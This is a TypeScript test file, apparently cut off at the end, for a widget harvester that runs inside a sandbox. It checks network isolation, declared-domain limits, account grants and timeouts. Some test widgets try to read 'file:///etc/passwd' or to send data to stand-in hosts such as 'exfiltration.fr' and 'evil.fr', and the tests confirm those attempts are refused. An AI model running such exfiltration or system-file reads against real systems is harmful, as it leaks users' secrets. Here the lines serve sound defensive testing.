import { describe, it, expect, afterEach, vi } from "vitest";
import { spawn } from "node:child_process";
import { PassThrough } from "node:stream";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdir, readFile, rm, stat, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { join } from "node:path";
import { cheminsEspace } from "../../src/chemins.js";
import { lireAccueil } from "../../src/accueil/lire.js";
import { Atelier, IMAGE } from "../../src/conteneur/atelier.js";
import { DeclarationWidget, type WidgetLu } from "../../src/accueil/schemas.js";
import { ecrireDonnees, ecrireEtatWidget, lireEtatWidget, supprimerDonnees } from "../../src/accueil/donnees.js";
import { IaLocale } from "../../src/ia/ia-locale.js";
import { PontFactice } from "../../src/mcp/pont-factice.js";
import { accorder, lireAccords, retirerAccord } from "../../src/widgets/accords.js";
import { erreurDuNoyau, executerEssai, executerRecolte, type LanceurProcessus } from "../../src/widgets/recolte.js";
import { PROFIL_REFUSE } from "../../src/workflows/executer.js";
import { ecrireExecution, idEssai, lireExecution, listerExecutions, type Execution } from "../../src/workflows/executions.js";
import { avecMemoire, ecrireMemoire, lireMemoire } from "../../src/workflows/memoire.js";
import { Menagement } from "../../src/workflows/menagement.js";
import { urlRecherche } from "../../src/workflows/duckduckgo.js";
import { dossierTemporaire } from "../aide/temporaire.js";
import { executeurFactice } from "../aide/executeur-factice.js";
import { fauxKev, fauxOllama, type FauxServeur } from "../aide/faux-ia.js";

const MOTEUR = join(import.meta.dirname, "..", "..", "docker", "moteur");
const SCRIPT = join(MOTEUR, "recolteur.mjs");
const MAINTENANT = new Date("2026-10-28T10:00:00.000Z");
const horloge = () => MAINTENANT;

const aFermer: { fermer(): Promise<void> }[] = [];
const iaAArreter: IaLocale[] = [];
afterEach(async () => {
  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
  await Promise.all(iaAArreter.splice(0).map((i) => i.arreter()));
});

/** Small HTTP server: `routes[chemin]` answers. */
async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
  const requetes: { url: string; enTetes: Record<string, unknown> }[] = [];
  const s: Server = createServer((req, res) => {
    requetes.push({ url: req.url ?? "", enTetes: req.headers });
    const r = routes[req.url ?? ""];
    if (r) r(res);
    else {
      res.writeHead(404);
      res.end();
    }
  });
  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
  const port = (s.address() as AddressInfo).port;
  const serveur = {
    port,
    url: `http://127.0.0.1:${port}`,
    requetes,
    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
  };
  aFermer.push(serveur);
  return serveur;
}

interface Contexte {
  widget: WidgetLu & { declaration: DeclarationWidget };
  dossierWidgets: string;
  espace: string;
  commandes: string[][];
  tues: number;
  executer: ReturnType<typeof executeurFactice>;
  atelier: Atelier;
  lancer: LanceurProcessus;
}

/** Creates a widget `id` (widget.json + recolte.mjs) and a launcher that runs the harvester locally, without docker. */
async function preparer(id: string, code: string, sources = { compte: [] as string[], publiques: [] as string[] }, config: unknown = { a: 1 }): Promise<Contexte> {
  const espace = await dossierTemporaire();
  const dossier = join(espace, "accueil", "widgets", id);
  await mkdir(dossier, { recursive: true });
  const brut = {
    nom: "Test",
    tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } },
    recolte: { minutes: 60 },
    sources,
    config,
  };
  await writeFile(join(dossier, "widget.json"), JSON.stringify(brut));
  await writeFile(join(dossier, "recolte.mjs"), code);
  const declaration = DeclarationWidget.parse(brut);
  const executer = executeurFactice([]);
  const ctx: Contexte = {
    widget: {
      id,
      dossier,
      declaration,
      etat: { statut: "ok", derniereMaj: null, derniereTentative: null },
      donnees: null,
      exemple: null,
      aRecolte: true,
      aWorkflow: false,
      aAffichage: true,
    },
    dossierWidgets: await dossierTemporaire(),
    espace,
    commandes: [],
    tues: 0,
    executer,
    atelier: new Atelier({ chemins: cheminsEspace(espace), docker: "docker", executer: executer.executer }),
    lancer: (cmd, args) => {
      ctx.commandes.push([cmd, ...args]);
      const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
      return {
        stdin: e.stdin,
        stdout: e.stdout,
        stderr: e.stderr,
        tuer: () => {
          ctx.tues++;
          e.kill("SIGKILL");
        },
        fin: new Promise((ok) => e.on("close", (c) => ok(c))),
      };
    },
  };
  return ctx;
}

async function ia(o: { kev?: FauxServeur; ollama?: FauxServeur } = {}) {
  const i = new IaLocale({ dossier: await dossierTemporaire(), executer: executeurFactice([]).executer, kevUrl: o.kev?.url ?? "http://127.0.0.1:9", ollamaUrl: o.ollama?.url ?? "http://127.0.0.1:9" });
  iaAArreter.push(i);
  return i;
}

const pontLecture = (refuser: string[] = [], redirections?: Record<string, string>) =>
  new PontFactice([], {
    actif: null,
    autoriser: false,
    lecture: {
      pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [{ texte: "a", url: "https://app.daily.dev/a" }] }],
      refuser,
      redirections,
    },
  });

const appelsLecture = (p: PontFactice) => p.appels.filter((a) => a.methode === "lirePageInvisible");

async function recolter(ctx: Contexte, o: { ia?: IaLocale | Pick<IaLocale, "kev" | "gemma">; pont?: PontFactice; delaiMs?: number } = {}) {
  return executerRecolte({
    id: ctx.widget.id,
    widget: ctx.widget,
    dossierWidgets: ctx.dossierWidgets,
    moteur: MOTEUR,
    atelier: ctx.atelier,
    lancer: ctx.lancer,
    ia: (o.ia ?? (await ia())) as IaLocale,
    pont: o.pont ?? pontLecture(),
    horloge,
    delaiMs: o.delaiMs,
    adressesLocales: true,
  });
}

const optionsDe = (ctx: Contexte) => ({
  id: ctx.widget.id,
  widget: ctx.widget as WidgetLu,
  dossierWidgets: ctx.dossierWidgets,
  moteur: MOTEUR,
  atelier: ctx.atelier,
  lancer: ctx.lancer,
  ia: null,
  pont: pontLecture(),
  horloge,
  adressesLocales: true,
});

const lireJson = async (chemin: string) => JSON.parse(await readFile(chemin, "utf8"));

describe("executerRecolte", () => {
  it("a successful harvest writes donnees.json and the ok state in dossierWidgets", async () => {
    const web = await serveurWeb({ "/flux.json": (res) => { res.writeHead(200, { "content-type": "application/json" }); res.end('{"x":42}'); } });
    const kev = await fauxKev({ q: { type: "noul", noul: 0.8 } });
    const ollama = await fauxOllama("bonjour");
    aFermer.push(kev, ollama);
    const ctx = await preparer(
      "meteo",
      `export default async (w) => {
        const j = await w.recuperer("${web.url}/flux.json", { format: "json" });
        const p = await w.lirePage("https://app.daily.dev/");
        const k = await w.kev("etat", { q: { type: "noul", instructions: "?" } });
        const g = await w.gemma("salut");
        w.journal("trace du widget");
        return { j, titre: p.titre, k, g, cfg: w.config, prec: w.precedent, quand: w.maintenant };
      };`,
    );
    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
    const pont = pontLecture();
    const r = await recolter(ctx, { ia: await ia({ kev, ollama }), pont });

    const attendu = {
      j: { x: 42 },
      titre: "Fil",
      k: { q: { type: "noul", noul: 0.8 } },
      g: "bonjour",
      cfg: { a: 1 },
      prec: { ancien: true },
      quand: MAINTENANT.toISOString(),
    };
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual(attendu);
    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual(attendu);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "meteo");
    expect(etat).toMatchObject({ statut: "ok", derniereMaj: MAINTENANT.toISOString(), derniereTentative: MAINTENANT.toISOString() });
    expect(etat.journal).toContain("trace du widget");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null, adressesLocales: true }]);
    // No cookie or identifier sent.
    expect(web.requetes[0]!.enTetes.cookie).toBeUndefined();
    expect(web.requetes[0]!.enTetes.authorization).toBeUndefined();
    // Nothing is written in the space.
    expect(existsSync(join(ctx.widget.dossier, "donnees.json"))).toBe(false);
    expect(existsSync(join(ctx.widget.dossier, "etat.json"))).toBe(false);
    // The launcher receives the workshop's docker command.
    expect(ctx.commandes[0]).toEqual(ctx.atelier.commandeRecolte("meteo", ctx.widget.dossier, MOTEUR));
  });

  it("commandeRecolte mounts the widget as :ro, cuts the network (--network none) and mounts nothing else from the space", async () => {
    const atelier = new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const c = atelier.commandeRecolte("meteo", "/Users/t/WebAiOs/accueil/widgets/meteo", "/app/docker/moteur");
    expect(c).toEqual([
      "/usr/local/bin/docker", "run", "-i", "--rm",
      "--name", "webaios-recolte-meteo",
      "--network", "none",
      "--read-only",
      "--tmpfs", "/tmp",
      "-v", "/Users/t/WebAiOs/accueil/widgets/meteo:/widget:ro",
      "-v", "/app/docker/moteur:/opt/webaios/moteur:ro",
      "--memory", "512m",
      "--pids-limit", "128",
      IMAGE,
      "timeout", "-k", "5", "180",
      "node", "/opt/webaios/moteur/recolteur.mjs", "/widget",
    ]);
    const volumes = c.flatMap((x, i) => (c[i - 1] === "-v" ? [x] : []));
    expect(volumes).toHaveLength(2);
    expect(volumes.every((v) => v.endsWith(":ro"))).toBe(true);
    expect(c.filter((x) => x.includes("/Users/t/WebAiOs")).every((x) => x.startsWith("/Users/t/WebAiOs/accueil/widgets/meteo:"))).toBe(true);
    expect(() => atelier.commandeRecolte("../x", "/d", "/r")).toThrow();
    expect(() => new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: null }).commandeRecolte("meteo", "/d", "/r")).toThrow();
  });

  it("supprimerRecolte forces the container's removal", async () => {
    const ctx = await preparer("meteo", "export default async () => 1;");
    await ctx.atelier.supprimerRecolte("meteo");
    expect(ctx.executer.appels.map((a) => [a.commande, ...a.args])).toEqual([["docker", "rm", "-f", "webaios-recolte-meteo"]]);
  });

  it("a harvest that fails keeps the previous data and records the error and the log", async () => {
    const ctx = await preparer("meteo", `export default async (w) => { console.log("avant l'erreur"); throw new Error("boum ${"x".repeat(900)}"); };`);
    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.donnees).toBeUndefined();
    expect(r.etat.erreur).toContain("boum");
    expect(r.etat.erreur!.length).toBeLessThanOrEqual(500);
    expect(r.etat.journal).toContain("avant l'erreur");
    expect(r.etat.derniereTentative).toBe(MAINTENANT.toISOString());
    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual({ ancien: true });
    expect(await lireEtatWidget(ctx.dossierWidgets, "meteo")).toEqual(r.etat);
  });

  it("the log keeps the last 2,000 characters of the error output", async () => {
    const ctx = await preparer("meteo", `export default async (w) => { for (let i = 0; i < 500; i++) w.journal("ligne " + i); return 1; };`);
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.etat.journal!.length).toBeLessThanOrEqual(2000);
    expect(r.etat.journal).toContain("ligne 499");
    expect(r.etat.journal).not.toContain("ligne 1\n");
  });

  it("a non-zero output without an end is an error", async () => {
    const ctx = await preparer("meteo", `export default async () => { process.exit(3); };`);
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("erreur");
    expect(r.etat.erreur).toContain("3");
  });

  it("timeout exceeded: process killed, error state « Délai dépassé »", async () => {
    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
    await ecrireDonnees(ctx.dossierWidgets, "lent", { ancien: true });
    const debut = Date.now();
    const r = await recolter(ctx, { delaiMs: 600 });
    expect(Date.now() - debut).toBeLessThan(5000);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
    expect(ctx.tues).toBeGreaterThan(0);
    expect(ctx.executer.appels.some((a) => a.args.join(" ") === "rm -f webaios-recolte-lent")).toBe(true);
    expect(await lireJson(join(ctx.dossierWidgets, "lent", "donnees.json"))).toEqual({ ancien: true });
  });

  it("a line over 4 MB kills the harvest: « Réponse trop grande »", async () => {
    const ctx = await preparer("gros", `export default async () => { process.stdout.write("x".repeat(5 * 1024 * 1024)); await new Promise(() => {}); };`);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Réponse trop grande" });
    expect(ctx.tues).toBeGreaterThan(0);
  });

  it("several in-flight calls each receive their own response", async () => {
    const web = await serveurWeb({
      "/lent": (res) => setTimeout(() => res.end("lent"), 300),
      "/vite": (res) => res.end("vite"),
    });
    const ctx = await preparer(
      "multi",
      `export default async (w) => Promise.all([w.recuperer("${web.url}/lent"), w.recuperer("${web.url}/vite"), w.recuperer("${web.url}/vite")]);`,
    );
    const r = await recolter(ctx);
    expect(r.donnees).toEqual(["lent", "vite", "vite"]);
  });

  it("recuperer: http(s) only, without credentials in the URL", async () => {
    const ctx = await preparer(
      "public",
      `const essai = (p) => p.then(() => "ok", (e) => e.message);
      export default async (w) => [
        await essai(w.recuperer("file:///etc/passwd")),
        await essai(w.recuperer("https://moi:secret@exemple.fr/")),
        await essai(w.recuperer("pas une url")),
      ];`,
    );
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    const [fichier, identifiants, invalide] = r.donnees as string[];
    expect(fichier).toMatch(/http/);
    expect(identifiants).toMatch(/identifiants/i);
    expect(invalide).toMatch(/invalide/i);
  });

  it("recuperer: a local address is refused by default", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("secret local") });
    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/").catch((e) => e.message);`);
    const r = await executerRecolte({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: MOTEUR, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ia(), pont: pontLecture(), horloge,
    });
    expect(r.donnees).toMatch(/locale/);
    expect(web.requetes).toHaveLength(0);
  });

  it("recuperer: « localhost. » (trailing dot) is a local address, refused", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("secret local") });
    const ctx = await preparer(
      "public",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("http://localhost.:${web.port}/")), await essai(w.lirePage("http://localhost.:${web.port}/"))];`,
    );
    const pont = pontLecture();
    const r = await executerRecolte({
      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, moteur: MOTEUR, atelier: ctx.atelier,
      lancer: ctx.lancer, ia: await ia(), pont, horloge,
    });
    const [rec, page] = r.donnees as string[];
    expect(rec).toMatch(/^refus: .*locale/);
    expect(page).toMatch(/^refus: .*locale/);
    expect(web.requetes).toHaveLength(0);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("recuperer: response over 5 MB refused", async () => {
    const web = await serveurWeb({ "/gros": (res) => res.end("x".repeat(5 * 1024 * 1024 + 10)) });
    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/gros").then((t) => t.length, (e) => e.message);`);
    const r = await recolter(ctx);
    expect(r.donnees).toMatch(/5 Mo/);
  });

  it("without lirePageInvisible, lirePage answers « Lecture de pages indisponible »", async () => {
    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://a.fr/").catch((e) => e.message);`);
    const r = await recolter(ctx, { pont: new PontFactice([], { actif: null, autoriser: false }) });
    expect(r.donnees).toBe("Lecture de pages indisponible");
  });

  it("widget without an account: lirePage with an account is refused", async () => {
    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).catch((e) => e.message);`);
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(appelsLecture(pont)).toHaveLength(0);
  });
});

describe("executerRecolte, widget with an account", () => {
  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };

  it("widget with an account: lirePage compte without a grant → accord-requis, no read", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ ancien: true });
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
  });

  it("grant removed during the harvest: the read with an account does not happen, accord-requis", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { await w.kev("x", {}); return w.lirePage("https://app.daily.dev/", { compte: true }); };`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const faux = {
      kev: async () => { await retirerAccord(ctx.dossierWidgets, "daily"); return {}; },
      gemma: async () => "",
    };
    const r = await recolter(ctx, { pont, ia: faux });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("with a valid grant, lirePage compte reads in the grant's profile", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toBe("articles");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true }]);
  });

  it("lirePage compte to a domain not declared as account is refused", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://evil.fr/", { compte: true }).catch((e) => e.message);`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/non déclaré/);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("widget with an account: recuperer to an undeclared domain is refused", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
        await essai(w.recuperer("http://localhost:${web.port}/")),
        await essai(w.lirePage("https://exfiltration.fr/")),
        await essai(w.recuperer("${web.url}/")),
      ];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const [externe, autreNom, page, declare] = r.donnees as string[];
    expect(externe).toMatch(/^refus: .*non déclaré/);
    expect(autreNom).toMatch(/^refus: .*non déclaré/);
    expect(page).toMatch(/^refus: .*non déclaré/);
    expect(declare).toBe("ok");
    expect(web.requetes).toHaveLength(1);
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("widget with an account: a redirect to an undeclared domain is refused", async () => {
    const cible = await serveurWeb({ "/fuite": (res) => res.end("fuite") });
    const web = await serveurWeb({
      "/redir": (res) => { res.writeHead(302, { location: `http://localhost:${cible.port}/fuite` }); res.end(); },
      "/redir-ok": (res) => { res.writeHead(301, { location: "/fin" }); res.end(); },
      "/fin": (res) => res.end("arrivé"),
    });
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
      export default async (w) => [await essai(w.recuperer("${web.url}/redir")), await essai(w.recuperer("${web.url}/redir-ok"))];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    const [fuite, ok] = r.donnees as string[];
    expect(fuite).toMatch(/^refus: .*non déclaré/);
    expect(ok).toBe("arrivé");
    expect(cible.requetes).toHaveLength(0);
  });

  it("widget with an account and without public ones: no public fetch", async () => {
    const web = await serveurWeb({ "/": (res) => res.end("ok") });
    const ctx = await preparer("daily", `export default async (w) => w.recuperer("${web.url}/").catch((e) => "refus: " + e.message);`, { compte: ["app.daily.dev"], publiques: [] });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.donnees).toMatch(/^refus: .*non déclaré/);
    expect(web.requetes).toHaveLength(0);
  });

  it("a declared domain written with a trailing dot is the same domain", async () => {
    const ctx = await preparer(
      "daily",
      `const essai = (p) => p.then((x) => x.titre ?? x, (e) => "refus: " + e.message);
      export default async (w) => [
        await essai(w.lirePage("https://app.daily.dev./", { compte: true })),
        await essai(w.lirePage("https://evil.fr./", { compte: true })),
      ];`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    const [declare, autre] = r.donnees as string[];
    expect(declare).not.toMatch(/^refus/);
    expect(autre).toMatch(/^refus: .*non déclaré/);
    expect(appelsLecture(pont).map((a) => a.args[0])).toEqual(["https://app.daily.dev./"]);
  });

  it("lirePage compte redirected outside the account domains: refused, the text does not leave", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/vole", titre: "Ailleurs", texte: "texte secret", liens: [] }],
        redirections: { "https://app.daily.dev/": "https://evil.fr/vole" },
      },
    });
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/^refus: Page refusée.*evil\.fr/);
    expect(JSON.stringify(r.donnees)).not.toContain("texte secret");
    expect(appelsLecture(pont)[0]!.args[1]).toEqual({ profil: "perso", domaines: ["app.daily.dev"], adressesLocales: true });
  });

  it("public lirePage of a widget with an account: public domains passed to the bridge, redirect outside the list refused", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => w.lirePage("http://127.0.0.1/?d=secret").then((p) => p.texte, (e) => "refus: " + e.message);`,
      sources,
    );
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://evil.fr/?d=secret", titre: "", texte: "ailleurs", liens: [] }],
        redirections: { "http://127.0.0.1/?d=secret": "https://evil.fr/?d=secret" },
      },
    });
    const r = await recolter(ctx, { pont });
    expect(r.donnees).toMatch(/^refus: Page refusée.*non déclaré/);
    expect(appelsLecture(pont)[0]!.args[1]).toEqual({ profil: null, domaines: ["127.0.0.1"], adressesLocales: true });
  });

  it("without the adressesLocales option, the bridge does not receive adressesLocales (it then refuses local addresses)", async () => {
    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/")).titre;`);
    const pont = pontLecture();
    const r = await executerRecolte({ ...optionsDe(ctx), pont, adressesLocales: false });
    expect(r.donnees).toBe("Fil");
    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null }]);
  });

  it("ProfilRefuse from the bridge: grant removed, state accord-requis", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    await accorder(ctx.dossierWidgets, "autre", { domaines: ["a.fr"], publiques: [], profil: "perso" });
    const r = await recolter(ctx, { pont: pontLecture(["prive"]) });
    expect(r.etat.statut).toBe("accord-requis");
    expect(r.etat.erreur).toBeTruthy();
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({ autre: { domaines: ["a.fr"], publiques: [], profil: "perso" } });
    // The data read with this account leaves with the grant.
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("ProfilRefuse then account removed: the public harvest receives nothing of the account, nor does the home", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
    expect((await recolter(ctx, { pont: pontLecture(["prive"]) })).etat.statut).toBe("accord-requis");
    // The agent removes the account: the widget becomes public again (neither account nor grant).
    const brut = { nom: "Test", tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } }, recolte: { minutes: 60 }, sources: { compte: [], publiques: [] } };
    await writeFile(join(ctx.widget.dossier, "widget.json"), JSON.stringify(brut));
    await writeFile(join(ctx.widget.dossier, "recolte.mjs"), "export default async (w) => ({ prec: w.precedent });");
    const accueil = await lireAccueil(cheminsEspace(ctx.espace), ctx.dossierWidgets);
    const lu = accueil.widgets.find((w) => w.id === "daily")!;
    expect("donnees" in lu && lu.donnees).toBeNull(); // what donnees_widget would return
    const r = await executerRecolte({ ...optionsDe(ctx), widget: lu });
    expect(r.donnees).toEqual({ prec: null });
  });

  it("declaration modified (domains changed): the grant is removed and the previous data erased", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev", "ancien.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("accord-requis");
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(existsSync(join(ctx.dossierWidgets, "daily", "donnees.json"))).toBe(false);
  });

  it("account removed from the declaration with a recorded grant: grant removed, data erased, precedent null", async () => {
    const ctx = await preparer("daily", `export default async (w) => ({ prec: w.precedent });`, { compte: [], publiques: [] });
    await ecrireDonnees(ctx.dossierWidgets, "daily", { secret: "du compte" });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const r = await recolter(ctx);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ prec: null });
    expect(await lireAccords(ctx.dossierWidgets)).toEqual({});
    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ prec: null });
  });

  it("erreurDuNoyau: fixed core messages recognized, widget text not", () => {
    expect(erreurDuNoyau("Délai dépassé")).toBe(true);
    expect(erreurDuNoyau("Réponse trop grande")).toBe(true);
    expect(erreurDuNoyau("Accord requis pour lire avec ton compte : app.daily.dev")).toBe(true);
    // Written with the widget's exit code: counts as widget text.
    expect(erreurDuNoyau("La récolte s'est arrêtée sans résultat (code 1)")).toBe(false);
    expect(erreurDuNoyau("Mise à jour impossible : atelier arrêté")).toBe(true);
    expect(erreurDuNoyau("SECRET")).toBe(false);
    expect(erreurDuNoyau("Délai dépassé SECRET")).toBe(false);
    expect(erreurDuNoyau("La récolte s'est arrêtée sans résultat (code 1) SECRET")).toBe(false);
  });

  it("a grant whose domains no longer match the declaration is no longer valid", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
    const pont = pontLecture();
    const r = await recolter(ctx, { pont });
    expect(r.etat.statut).toBe("accord-requis");
    expect(appelsLecture(pont)).toHaveLength(0);
  });

  it("error thrown by the widget: never marked as the core's, even when it imitates a core message", async () => {
    for (const imitation of [
      "Accord requis pour lire avec ton compte : " + (123456789).toString(36),
      "La récolte s'est arrêtée sans résultat (code 123456789)",
    ]) {
      const ctx = await preparer(
        "daily",
        `export default async (w) => { await w.lirePage("https://app.daily.dev/", { compte: true }); throw new Error(${JSON.stringify(imitation)}); };`,
        sources,
      );
      await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
      const r = await recolter(ctx);
      expect(r.etat).toMatchObject({ statut: "erreur", erreur: imitation });
      expect(r.etat.erreurNoyau).toBeUndefined();
      expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).erreurNoyau).toBeUndefined();
    }
  });

  it("errors written by the core: marked as such (grant required, timeout exceeded)", async () => {
    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
    const r = await recolter(ctx);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreur: "Accord requis pour lire avec ton compte : app.daily.dev", erreurNoyau: true });
    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).erreurNoyau).toBe(true);
    const lent = await preparer("lent", `export default () => new Promise(() => {});`);
    expect((await recolter(lent, { delaiMs: 300 })).etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé", erreurNoyau: true });
  });

  it("grant refused during the harvest, after the read with an account: nothing is written, accord-requis", async () => {
    const ctx = await preparer(
      "daily",
      `export default async (w) => { const p = await w.lirePage("https://app.daily.dev/", { compte: true }); await w.kev("x", {}); return p.texte; };`,
      sources,
    );
    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const pont = pontLecture();
    // What refuserAccord does: grant removed, data erased.
    const faux = {
      kev: async () => {
